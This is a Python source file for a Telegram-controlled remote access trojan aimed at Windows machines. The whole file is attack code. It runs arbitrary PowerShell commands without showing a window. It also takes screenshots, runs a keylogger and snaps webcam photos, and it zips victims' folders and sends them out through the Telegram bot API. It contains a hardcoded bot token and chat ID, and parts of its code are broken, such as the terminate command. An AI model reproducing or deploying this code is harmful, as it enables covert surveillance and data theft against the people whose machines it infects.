from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes
from telegram import Update
import subprocess
from io import BytesIO
import os
import requests
import zipfile #making zip file
import pyautogui # for screenshot
import psutil #for drives in system
import mimetypes #for file type extraction
import keyboard #for keylogger
from datetime import datetime #for file creation
import threading # f multi-processes[keylogger]or
import cv2 # for camera

BOT_TOKEN = '7958837921:AAE3B36Voc5ZAZTx5U1XV9DHmx3UIVl_05A'
CHAT_ID = '5160506216'

current_dir = os.getcwd()
keylogger_running = False
keylogger_thread = None
awaiting_file_upload = False


async def handle_all_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global awaiting_file_upload

    if not awaiting_file_upload:
        return

    user_file = None
    file_name = None

    # Check and get file based on type
    if update.message.document:
        user_file = update.message.document
        file_name = user_file.file_name
    elif update.message.photo:
        user_file = update.message.photo[-1]  # highest resolution
        file_name = "photo.jpg"
    elif update.message.audio:
        user_file = update.message.audio
        file_name = user_file.file_name or "audio.mp3"
    elif update.message.video:
        user_file = update.message.video
        file_name = user_file.file_name or "video.mp4"
    else:
        await update.message.reply_text("❌ Unsupported file type.")
        return

    # Download the file
    telegram_file = await context.bot.get_file(user_file.file_id)
    save_path = os.path.join(current_dir, file_name)
    await telegram_file.download_to_drive(save_path)

    await update.message.reply_text(f"✅ File saved to:\n{save_path}")
    awaiting_file_upload = False



async def reply_based_on_text(update, context):
    global current_dir, keylogger_running, keylogger_thread
    text = update.message.text.strip()

    if text.lower().startswith("cd"):                                                        # tracking of the directories
        try:
            if text.strip().lower() == "cd":
                await update.message.reply_text(current_dir)
                current_dir = os.path.expanduser("~")
            else:
                path = text[3:].strip().strip('"').strip("'")
                new_path = os.path.abspath(os.path.join(current_dir, path))
                if os.path.isdir(new_path):
                    current_dir = new_path
                else:
                    await update.message.reply_text("No such directory.")
                    return
            await update.message.reply_text(f"Changed directory to:\n{current_dir}")
            return
        except Exception as e:
            await update.message.reply_text(str(e))
            return

    elif text.strip().lower() == "ss":                                                         # for screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        try:
            await update.message.reply_document(document=open("screenshot.png", "rb"))
        except Exception as e:
            await update.message.reply_text(str(e))
        os.remove("screenshot.png")
        return

    elif text.strip().lower() == "drives":                                                     # showing all the disk partition
        drives = psutil.disk_partitions()
        for d in drives:
            await update.message.reply_text(d.device)

    elif text.lower().startswith("changedrive"):
        path = text[len("changedriver"):].strip()
        if os.path.isdir(path):
            current_dir = path
            await update.message.reply_text(f"📁 Changed drive to:\n{current_dir}")
        else:
            await update.message.reply_text("❌ Drive or path does not exist.")

    elif text.lower().startswith("extract"):                                                   # extraction of files..

        path = text[len("extract"):].strip()
        TARGET_PATH = os.path.abspath(os.path.join(current_dir, path))

        if os.path.exists(TARGET_PATH):
            if os.path.isdir(TARGET_PATH):
                zip_path = TARGET_PATH.rstrip('/\\') + '.zip'
                zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
                for root, _, files in os.walk(TARGET_PATH):
                    for file in files:
                        abs_path = os.path.join(root, file)
                        rel_path = os.path.relpath(abs_path, TARGET_PATH)
                        zipf.write(abs_path, rel_path)
                zipf.close()
                file_to_send = zip_path
            else:
                file_to_send = TARGET_PATH

            # Detect file type
            mime_type, _ = mimetypes.guess_type(file_to_send)
            endpoint = 'sendDocument'  # default

            if mime_type:
                if mime_type.startswith('image'):
                    endpoint = 'sendPhoto'
                elif mime_type.startswith('video'):
                    endpoint = 'sendVideo'
                elif mime_type.startswith('audio'):
                    endpoint = 'sendAudio'

            url = f'https://api.telegram.org/bot{BOT_TOKEN}/{endpoint}'

            with open(file_to_send, 'rb') as f:
                files = {endpoint.replace('send', '').lower(): f}
                data = {'chat_id': CHAT_ID}
                requests.post(url, data=data, files=files)

            # Delete temporary zip file if created
            if file_to_send.endswith('.zip') and os.path.isdir(TARGET_PATH):
                os.remove(file_to_send)
        else:
            await update.message.reply_text("Path does not exist:\n" + TARGET_PATH)
    
    elif text.strip().lower() == "keyscan":                                                     # keylogger                           
        if keylogger_running:
            await update.message.reply_text("Keylogger is already running.")
            return

        def log_keys():
            def on_key(event):
                if event.event_type == 'down':
                    with open("keylog.txt", "a") as f:
                        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {event.name}\n")

            keyboard.hook(on_key)
            while keylogger_running:
                pass
            keyboard.unhook_all()

        keylogger_running = True
        keylogger_thread = threading.Thread(target=log_keys, daemon=True)
        keylogger_thread.start()
        await update.message.reply_text("Keylogger started.")

    elif text.strip().lower() == "keystop":                                                      # stopping keylogger
        if not keylogger_running:
            await update.message.reply_text("Keylogger is not running.")
            return

        keylogger_running = False
        await update.message.reply_text("Keylogger stopped. Sending log...")

        if os.path.exists("keylog.txt"):
            with open("keylog.txt", "rb") as file:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    data={'chat_id': CHAT_ID},
                    files={'document': file}
                )
            os.remove("keylog.txt")
    
    elif text.strip().lower() == "capture":                                                       # web capture
        def capture_webcam_image(filename="webcam.jpg"):
            cap = cv2.VideoCapture(0)  # 0 = default camera

            if not cap.isOpened():
                return

            ret, frame = cap.read()
            if ret:
                cv2.imwrite(filename, frame)

            cap.release()

            with open(filename,'rb') as f:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    data={'chat_id': CHAT_ID},
                    files={'photo': f})

        capture_webcam_image()
        
        os.remove("webcam.jpg")

    elif text.strip().lower() == "sendfile":                                               # recive file
        global awaiting_file_upload
        awaiting_file_upload = True
        await update.message.reply_text("Send file")
        return

    
    elif text.strip().lower() == "terminate":                                              # remove program from system
        path = os.getcwd()
        os.remove()

    elif text.strip().lower() == "help":
        text = "ss -> screenshot\n" \
        "extract -> extratcion of files\n" \
        "drives -> show all drives\n" \
        "chnagedrive -> change to other drive\n" \
        "keyscan -> keylogger activation\n" \
        "keystop -> keylogger stops\n" \
        "capture -> live photo via webcam\n" \
        "terminate -> remove programe from the system\n" \
        "sendfile -> send any type of file to the system"
        await update.message.reply_text(text)
    
    else:                                                                                   # normal powershell interface output
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        result = subprocess.run(
            ["powershell", "-Command", text],
            capture_output=True,
            text=True,
            cwd=current_dir,
            startupinfo=startupinfo
        )

        output = result.stdout.strip() or "No output"

        if len(output) > 4000:
            file = BytesIO(output.encode())
            file.name = "output.txt"
            await update.message.reply_document(file)
        else:
            await update.message.reply_text(output)

#Post-init function to send "bot is active" message after the bot starts
async def on_start(app):
    await app.bot.send_message(chat_id=CHAT_ID, text="✅ Bot is now active!")

# 🚀 Build application
app = ApplicationBuilder().token(BOT_TOKEN).post_init(on_start).build()
app.add_handler(MessageHandler(filters.TEXT, reply_based_on_text))

app.add_handler(MessageHandler(
    filters.Document.ALL |
    filters.PHOTO |
    filters.AUDIO |
    filters.VIDEO,
    handle_all_files
))

print("Bot is running...")
app.run_polling()

